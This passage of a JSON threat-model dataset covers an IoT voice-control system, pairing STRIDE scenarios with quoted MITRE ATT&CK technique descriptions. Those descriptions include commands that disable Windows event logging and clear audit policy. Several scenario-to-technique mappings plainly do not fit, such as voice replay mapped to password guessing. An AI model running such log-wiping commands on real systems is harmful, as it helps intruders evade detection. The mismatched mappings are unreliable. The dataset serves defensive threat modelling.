                    "Assumption": "There are no effective mitigation mechanisms in place to handle such attacks.",
                    "Role": "System",
                    "Condition": "Lack of mitigation mechanisms."
                }
            ],
            "Potential Impact": "Disruption of services, impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "service outage",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed or malicious commands to crash the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application does not validate incoming data correctly.",
                    "Role": "System",
                    "Condition": "Lack of input validation."
                },
                {
                    "Assumption": "The attacker knows the structure of the commands.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of command structure."
                },
                {
                    "Assumption": "Vulnerability exists in the client-side application that can be exploited via malformed commands.",
                    "Role": "System",
                    "Condition": "Presence of vulnerability."
                }
            ],
            "Potential Impact": "Application crashes, impacting availability and possibly leading to a loss of data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malformed commands",
                "client application",
                "input validation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts communication with the IoT controller by jamming the network signals.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the equipment and knowledge to jam network signals.",
                    "Role": "Attacker",
                    "Condition": "Capability to jam signals."
                },
                {
                    "Assumption": "The network communication protocols are susceptible to jamming attacks.",
                    "Role": "System",
                    "Condition": "Vulnerable communication protocols."
                },
                {
                    "Assumption": "There are no alternative communication mechanisms or fallback systems.",
                    "Role": "System",
                    "Condition": "Lack of fallback systems."
                }
            ],
            "Potential Impact": "Disruption of IoT device operations, impacting availability and reliability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network jamming",
                "IoT controller",
                "communication disruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application contains exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Presence of vulnerabilities."
                },
                {
                    "Assumption": "The attacker has access to the client-side application to execute exploits.",
                    "Role": "Attacker",
                    "Condition": "Access to application."
                },
                {
                    "Assumption": "There are no effective security measures in place to detect and prevent privilege escalation.",
                    "Role": "System",
                    "Condition": "Lack of security measures."
                }
            ],
            "Potential Impact": "Unauthorized access to higher privileges, compromising confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploit",
                "client application",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses weak access control mechanisms to elevate their privileges on the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are weak or not enforced properly.",
                    "Role": "System",
                    "Condition": "Weak access controls."
                },
                {
                    "Assumption": "The attacker has legitimate access, either through compromised credentials or as a legitimate user with limited privileges.",
                    "Role": "Attacker",
                    "Condition": "Access to credentials."
                },
                {
                    "Assumption": "The application does not have sufficient monitoring to detect unusual privilege escalations.",
                    "Role": "System",
                    "Condition": "Lack of monitoring."
                }
            ],
            "Potential Impact": "Unauthorized actions and access to sensitive data, compromising confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access controls",
                "server application",
                "unauthorized escalation"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker compromises cloud service credentials to obtain elevated access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service credentials are weak or have been exposed.",
                    "Role": "System",
                    "Condition": "Weak or exposed credentials."
                },
                {
                    "Assumption": "The attacker can use the compromised credentials to access cloud services.",
                    "Role": "Attacker",
                    "Condition": "Use of credentials."
                },
                {
                    "Assumption": "There are inadequate monitoring and alerting mechanisms for unusual access patterns.",
                    "Role": "System",
                    "Condition": "Lack of monitoring."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive cloud-stored data, compromising confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "credential compromise",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a legitimate user by recording and replaying voice commands to the microphone.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the microphone or a way to intercept audio signals.",
                    "Role": "Attacker",
                    "Condition": "The attacker is in the proximity of the device or has compromised the audio signal transmission."
                },
                {
                    "Assumption": "The system does not employ robust voice authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Authentication mechanism based on voice recognition is weak or nonexistent."
                },
                {
                    "Assumption": "User behavior is predictable, using similar commands frequently.",
                    "Role": "User",
                    "Condition": "The user often repeats similar commands, reducing the effort for capturing valid audio samples."
                }
            ],
            "Potential Impact": "Could lead to unauthorized access and control of IoT devices, compromising system integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice impersonation",
                "audio replay",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could manipulate the client-side application to send fabricated audio signals to the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the client-side application or can intercept and modify its traffic.",
                    "Role": "Attacker",
                    "Condition": "The attacker exploited a vulnerability in the client-side application."
                },
                {
                    "Assumption": "Lack of end-to-end encryption in transmitting audio signals to the server.",
                    "Role": "System Designer",
                    "Condition": "No robust encryption mechanisms for data in transit."
                },
                {
                    "Assumption": "The server does not perform rigorous validation of incoming signals.",
                    "Role": "System Designer",
                    "Condition": "Incoming audio signals are not thoroughly validated at the server end."
                }
            ],
            "Potential Impact": "May result in unauthorized commands being executed by IoT devices, breaching the system's integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "signal manipulation",
                "command injection",
                "client-server communication"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and redirects authentication communications, pretending to be a legitimate user to gain access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to network traffic and can intercept or redirect communications.",
                    "Role": "Attacker",
                    "Condition": "Compromised network environment or man-in-the-middle capability."
                },
                {
                    "Assumption": "The system relies on insecure or weak authentication mechanisms over the network.",
                    "Role": "System Designer",
                    "Condition": "Absence of secure authentication protocols in place."
                },
                {
                    "Assumption": "User credentials or tokens are not effectively protected or encrypted.",
                    "Role": "System Designer",
                    "Condition": "User authentication credentials transmitted in plaintext or weakly encrypted form."
                }
            ],
            "Potential Impact": "Compromised confidentiality, integrity, and availability of the entire system.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "authentication hijacking",
                "network interception"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the IoT controller and modifies its firmware to execute unauthorized commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Security flaws in physical protection or remote access protocols."
                },
                {
                    "Assumption": "The firmware update mechanism is not well-protected or authenticated.",
                    "Role": "System Designer",
                    "Condition": "Weak or no firmware integrity checks."
                },
                {
                    "Assumption": "There is no monitoring for unauthorized changes in the controller's firmware.",
                    "Role": "System Administrator",
                    "Condition": "Lack of regular integrity and security audits."
                }
            ],
            "Potential Impact": "Tampered firmware could lead to persistent unauthorized actions or shutdown of IoT devices, affecting system integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware modification",
                "IoT controller",
                "unauthorized commands"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters the communication between the client-side application and the server to modify commands and responses.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and modify the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Exploited vulnerabilities in communication protocols or network security."
                },
                {
                    "Assumption": "Lack of encryption and integrity checks for data in transit.",
                    "Role": "System Designer",
                    "Condition": "No secure communication protocols (e.g., SSL/TLS) in place."
                },
                {
                    "Assumption": "The server and client do not verify the authenticity and integrity of the data.",
                    "Role": "System Designer",
                    "Condition": "No checksums or cryptographic validation mechanisms implemented."
                }
            ],
            "Potential Impact": "Results in corrupted commands and data integrity issues, potential unauthorized access and control of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "signal interception",
                "communication modification",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Process Doppelg\u00e4nging",
                "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nProcess Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197",
                "technique_id": "T1055.013"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with access to cloud services inserts malicious data or scripts that get processed by the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has credentials or other means to access cloud services.",
                    "Role": "Attacker",
                    "Condition": "Credentials leakage or poor access controls."
                },
                {
                    "Assumption": "Cloud service integration lacks proper validation and sanitization of data.",
                    "Role": "System Designer",
                    "Condition": "Missing or weak data validation mechanisms."
                },
                {
                    "Assumption": "No monitoring or anomaly detection measures in place for cloud services.",
                    "Role": "System Administrator",
                    "Condition": "Absence of activity monitoring or alerts for suspicious behavior."
                }
            ],
            "Potential Impact": "Could introduce vulnerabilities, data corruption, or unauthorized actions, impacting system integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud services",
                "malicious injection",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker interacts with the system and claims that they did not perform a specific harmful action.",
            "Assumptions": [
                {
                    "Assumption": "The system does not keep detailed logs of user actions and identities.",
                    "Role": "System Designer",
                    "Condition": "Absence of comprehensive logging mechanisms."
                },
                {
                    "Assumption": "Logs are not tamper-evident or securely stored.",
                    "Role": "System Administrator",
                    "Condition": "Lack of secure storage and integrity checks for log files."
                },
                {
                    "Assumption": "There are no proper authentication mechanisms to uniquely identify users.",
                    "Role": "System Designer",
                    "Condition": "Weak or missing user authentication protocols."
                }
            ],
            "Potential Impact": "Hinders forensic investigation and accountability, leading to potential undetected malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action denial",
                "logging",
                "audit trails"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies having issued certain voice commands that led to unauthorized or damaging actions.",
            "Assumptions": [
                {
                    "Assumption": "Voice commands are not associated with verifiable user identities.",
                    "Role": "System Designer",
                    "Condition": "Voice commands are processed without linkage to user accounts."
                },
                {
                    "Assumption": "Voice command logs are not detailed or securely stored.",
                    "Role": "System Administrator",
                    "Condition": "Log files are incomplete or susceptible to tampering."
                },
                {
                    "Assumption": "No robust mechanisms to authenticate and validate user-issued commands via voice.",
                    "Role": "System Designer",
                    "Condition": "Weak voice recognition or authentication system."
                }
            ],
            "Potential Impact": "Impacts accountability and trust in the system, potentially affecting system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "voice command denial",
                "action attribution",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
